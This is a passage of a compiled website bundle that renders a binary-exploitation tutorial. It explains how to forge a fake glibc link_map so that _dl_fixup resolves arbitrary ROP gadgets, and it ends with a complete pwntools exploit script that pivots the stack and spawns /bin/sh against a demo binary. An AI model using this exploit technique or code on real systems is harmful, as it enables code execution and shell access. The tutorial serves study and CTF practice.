(13).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L123",children:(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L123",children:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L123"})})})})]}),"\n",(0,t.jsxs)(n.p,{children:["We want to avoid hitting this condition. ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L603",children:"STT_GNU_IFUNC"})," is for ifuncs, which are called to return the actual address of the function that should be called. String functions like ",(0,t.jsx)(n.code,{children:"memset"}),", ",(0,t.jsx)(n.code,{children:"memcpy"})," etc. will use these to select the most optimized one for your system during runtime (based on cpu features)."]}),"\n",(0,t.jsxs)(n.p,{children:["If one had a function which could be used to return arbitrary addresses, like a ",(0,t.jsx)(n.code,{children:"read_int"})," function you may see in CTFs, then you could actually get arbitrary gadgets like that."]}),"\n",(0,t.jsxs)(n.p,{children:["Alas, since we don't have that, we'll be ignoring it, so ensure that ",(0,t.jsx)(n.code,{children:"st_info & 0xf != 10"}),"."]}),"\n",(0,t.jsx)(n.h4,{id:"l_reloc_result",children:"l_reloc_result"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (14).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L133",children:(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L133",children:"https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L133"})})})})]}),"\n",(0,t.jsx)(n.p,{children:"Pretty straightfoward, but we wanna ignore this one too, as we simply don't care about it, plus we'd have to fulfil more constraints."}),"\n",(0,t.jsx)(n.h3,{id:"writing-to-memory",children:"Writing to memory"}),"\n",(0,t.jsxs)(n.p,{children:["For the demo binary, we'll select the (only) GOT entry ",(0,t.jsx)(n.code,{children:"read@GOT"}),", located at ",(0,t.jsx)(n.code,{children:"0x404000"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["We once again have the task of needing to write our structures to memory, but this time is unique, given that we'll need to write our fake link map at ",(0,t.jsx)(n.code,{children:"0x404008"}),". If we stack pivot there, then we'll need to also write our rop chain there too, overlapping with the link map. The other problem is ",(0,t.jsx)(n.code,{children:"_dl_fixup"})," has a large stack size, so with ",(0,t.jsx)(n.code,{children:"rsp"})," that low, it would crash."]}),"\n",(0,t.jsx)(n.p,{children:"There's a few ways around this, but the one I opted for was:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'p.send(b"A"*0x80 + p64(0x404008+0x80) + p64(read_gadget))\n'})}),"\n",(0,t.jsxs)(n.p,{children:["First pivot to the start, so that we write to ",(0,t.jsx)(n.code,{children:"rsi = 0x404008"}),". What we write here doesn't matter; all we care about is setting ",(0,t.jsx)(n.code,{children:"rsi"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'payload  = b"B"*0x80\npayload += p64(0x404f00) + p64(leave_ret)\npayload  = payload.ljust(0xf00-8, b"\\x00")\npayload += p64(0) + p64(e.plt.read)\np.send(payload)\n'})}),"\n",(0,t.jsxs)(n.p,{children:["Now that we've pivoted away from the start, we can call ",(0,t.jsx)(n.code,{children:"read()"})," with the existing registers, which should be exactly the same as the previous ",(0,t.jsx)(n.code,{children:"read()"}),", and thus writing again to where we want the link map to be (",(0,t.jsx)(n.code,{children:"0x404008"}),"). Then we would send the final payload, writing the link map and structures into memory, but also overwriting the return address of ",(0,t.jsx)(n.code,{children:"read()"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'p.send(link_map.ljust(0xf10-8, b"\\x00") + rop)\n'})}),"\n",(0,t.jsx)(n.admonition,{type:"info",children:(0,t.jsxs)(n.p,{children:["Unfortunately since the ",(0,t.jsx)(n.code,{children:"read()"})," size is bigger, this time we use ",(0,t.jsx)(n.code,{children:"time.sleep()"})," to separate the ",(0,t.jsx)(n.code,{children:"p.send()"})," calls, as larger read buffers may cause unintended consequences."]})}),"\n",(0,t.jsx)(n.h3,{id:"exploit-script-1",children:"Exploit script"}),"\n",(0,t.jsxs)(n.p,{children:["Below is the exploit to implement crafting a ropchain to call ",(0,t.jsx)(n.code,{children:'execve("/bin/sh", NULL, NULL)'}),", but can be easily edited to use any rop chain."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = context.binary = ELF(\'./vuln\')\nlibc = ELF(\'./libc\', checksec=False)\n\ndef construct_link_map(addr, syms, libc_sym):\n    symtab = b""\n    jmprel = b""\n    got_addr = libc.sym._IO_wide_data_2\n    for i, val in enumerate(syms):\n        # jmprel\n        jmprel += flat([\n            got_addr-libc_sym,  # r_offset\n            (i << 32) | 0x7,    # r_info (R_X86_64_JUMP_SLOT, sym=i)\n            #0,                 # r_addend\n        ], length=0x18)\n        # elf64_sym\n        symtab += flat({\n            4: p8(2),   # st_info  (!= STT_GNU_IFUNC=10)\n            5: p8(1),   # st_other (!= 0)\n            6: p16(69), # st_shndx (!= SHN_ABS=0xfff1)\n            8: val      # st_value\n        }, length=0x18)\n\n    length = 0x348\n    link_map = {\n        # l_addr\n        #0x00: 0,\n\n        # l_info[DT_PLTGOT]\n        #0x58: 0,\n\n        # l_info[DT_STRTAB]\n        # (this won\'t be used, but needs to be readable)\n        0x68: addr,\n\n        # l_info[DT_SYMTAB]\n        0x70: addr+length-8,\n\n        # l_info[DT_JMPREL]\n        0xf8: addr+length,\n\n        # l_ld_readonly=0\n        0x31c+2: p8(0),\n\n        # l_reloc_result\n        0x340: 0,\n    }\n    data = flat(link_map, length=length)[8:]\n    data += p64(addr+length+0x10)\n    data += p64(addr+length+0x10+len(symtab))\n    data += symtab + jmprel\n    return data\n\nclass Gadget:\n    def __init__(self, val):\n        self.val = val\n\ndef dlrop(rop, addr, libc_sym):\n    gadgets = list(set(filter(lambda x: isinstance(x, Gadget), rop)))\n    syms = []\n    gadget_symidx = {}\n    # allocate a reloc_arg for each gadget\n    for gadget in gadgets:\n        val = gadget.val\n        if val not in gadget_symidx:\n            gadget_symidx[val] = len(syms)\n            syms.append(val-libc_sym)\n    link_map = construct_link_map(addr, syms, libc_sym)\n    payload = b""\n    for x in rop:\n        if isinstance(x, Gadget):\n            payload += p64(0x401026) + p64(addr) + p64(gadget_symidx[x.val])\n        else:\n            payload += p64(x)\n    return link_map, payload\n\np = e.process()\n\nwritable = e.got.read\nleave_ret = e.sym.main+35\nret = leave_ret+1\nread_gadget = e.sym.main+8\n\n# set rsi=writable+8\np.send(b"A"*0x80 + p64(writable+8+0x80) + p64(read_gadget))\n\n# pivot to top, call read() to do the same read() as above\ntime.sleep(1)\np.send((b"B"*0x80 + p64(writable+0xf00) + p64(leave_ret)).ljust(0xf00-8, b"\\x00") + p64(0) + p64(e.plt.read))\n\nrop = ROP(libc)\npop_rdi = rop.find_gadget(["pop rdi", "ret"]).address\npop_rsi = rop.find_gadget(["pop rsi", "ret"]).address\npop_rdx_r12 = rop.find_gadget(["pop rdx", "pop r12", "ret"]).address\n\nrop = [\n    Gadget(pop_rdi), 0x404ff8,\n    Gadget(pop_rsi), 0,\n    Gadget(pop_rdx_r12), 0, 0,\n    Gadget(libc.sym.execve),\n]\n\nlink_map, rop = dlrop(rop, writable+0x00, libc.sym.read)\npayload = link_map.ljust(0xf10-8, b"\\x00") + rop\npayload = payload.ljust(0xff8-8, b"\\x00") + b"/bin/sh\\x00"\n\ntime.sleep(1)\np.send(payload)\n\np.interactive()\n'})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>d});var i=s(6540);const t={},r=i.createContext(t);function l(e){const n=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:l(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);